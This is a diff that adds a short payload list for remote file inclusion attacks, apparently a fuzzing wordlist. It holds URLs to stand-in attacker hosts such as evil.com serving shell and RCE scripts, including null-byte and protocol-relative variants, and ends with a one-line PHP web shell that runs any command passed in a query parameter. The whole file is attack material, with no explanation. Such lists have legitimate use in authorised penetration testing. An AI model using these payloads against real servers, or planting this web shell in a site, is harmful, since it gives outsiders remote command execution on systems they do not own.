@@ -1,0 +1,13 @@
+http://evil.com/shell.php
+https://evil.com/shell.php
+//evil.com/shell.php
+http://evil.com/rce.php
+http://evil.com/webshell.php
+http://evil.com/shell.php?cmd=id
+http://evil.com/payload.php
+http://attacker.com/shell.php
+http://evil.com/shell.txt
+http://evil.com/shell.php%00
+
+#basic shell
+<?php system($_GET['cmd']); ?>
